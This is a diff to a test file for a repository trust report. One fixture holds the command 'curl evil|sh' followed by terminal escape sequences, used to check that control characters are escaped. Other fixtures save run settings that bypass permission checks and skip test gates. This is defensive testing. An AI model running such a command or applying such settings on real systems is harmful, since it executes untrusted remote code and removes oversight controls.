@@ -674,6 +674,18 @@ describe("formatRepoTrustReport", () => {
     expect(lines.at(-1)).toContain("ndx trust accept .");
   });
 
+  it("stays bounded however many PRD items save run settings", () => {
+    for (let i = 0; i < 300; i++) {
+      const dir = join(repo, ".rex", "changes", "inbox", `c${i}`);
+      mkdirSync(dir, { recursive: true });
+      writeFileSync(join(dir, "index.md"), `---\nid: "c${i}"\nrun: {"skipTestGate":true,"permissionMode":"bypassPermissions"}\n---\n`);
+    }
+    const lines = formatRepoTrustReport(evaluateRepoTrust(repo, { ndxHome: home }), { inventory: true });
+    expect(lines.find((l) => l.includes("Read from:"))).toBe("  Read from: .rex/changes/ (300 PRD items with saved run settings)");
+    expect(lines.length).toBeLessThan(20);
+    for (const line of lines) expect(line.length).toBeLessThan(600);
+  });
+
   it("escapes terminal control characters in repository values; the digest keeps the raw value", () => {
     const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
     writeJson(".rex/config.json", { test: command });
